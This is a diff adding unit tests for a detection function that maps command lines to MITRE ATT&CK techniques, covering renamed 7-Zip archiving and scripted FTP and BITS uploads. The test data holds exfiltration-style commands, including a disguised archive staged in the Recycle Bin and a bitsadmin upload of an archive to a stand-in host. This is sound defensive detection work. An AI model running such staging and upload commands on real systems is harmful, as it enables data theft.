@@ -82,3 +82,32 @@ describe("unionEventTechniques", () => {
     expect(unionEventTechniques(table, events)).toHaveLength(1);
   });
 });
+
+describe("reconTechniques — renamed archivers and scripted uploads (#2090)", () => {
+  it("tags a renamed 7-Zip creating an archive by its switch signature", () => {
+    expect(reconTechniques("svch.exe", "svch.exe a -t7z C:\\$Recycle.Bin\\old.7z C:\\data")).toContain(
+      "T1560.001",
+    );
+    expect(reconTechniques("x.exe", "x.exe a -mx9 -tzip out.zip C:\\data")).toContain("T1560.001");
+    expect(reconTechniques("7z.exe", "7z a out.7z C:\\data")).toContain("T1560.001");
+  });
+
+  it("does not tag an archive extraction", () => {
+    expect(reconTechniques("svch.exe", "svch.exe x -t7z C:\\in.7z -oC:\\out")).not.toContain("T1560.001");
+  });
+
+  it("tags scripted FTP and BITS uploads as T1041", () => {
+    expect(reconTechniques("ftp.exe", "ftp.exe -v -s:ftp.txt")).toContain("T1041");
+    expect(reconTechniques("ftp", "ftp -i -s:C:\\Users\\Public\\u.txt 203.0.113.9")).toContain("T1041");
+    expect(
+      reconTechniques("bitsadmin.exe", "bitsadmin /transfer j /upload https://x.example/u C:\\a.7z"),
+    ).toContain("T1041");
+  });
+
+  it("does not tag interactive FTP or a BITS download as T1041", () => {
+    expect(reconTechniques("ftp.exe", "ftp.exe 203.0.113.9")).not.toContain("T1041");
+    expect(
+      reconTechniques("bitsadmin.exe", "bitsadmin /transfer j https://x.example/a.exe C:\\a.exe"),
+    ).not.toContain("T1041");
+  });
+});
